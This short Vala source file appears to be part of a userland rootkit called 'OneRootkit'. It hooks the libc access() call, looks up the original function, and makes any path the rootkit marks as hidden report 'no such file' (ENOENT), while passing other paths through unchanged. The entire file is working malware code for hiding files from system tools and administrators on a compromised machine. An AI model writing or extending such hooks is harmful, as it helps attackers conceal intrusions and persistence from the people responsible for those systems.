using Posix;

delegate unowned int AccessMethod(string path, int mode);

public static int access(string path, int mode) 
{
	AccessMethod oldAccess = (AccessMethod) DLHandles.LIBC().GetMethod("access");

	if(OneRootkit.IsPathHidden(path))
	{
		GLib.errno = Posix.ENOENT;
		return -1;
	}

	return oldAccess(path, mode);
}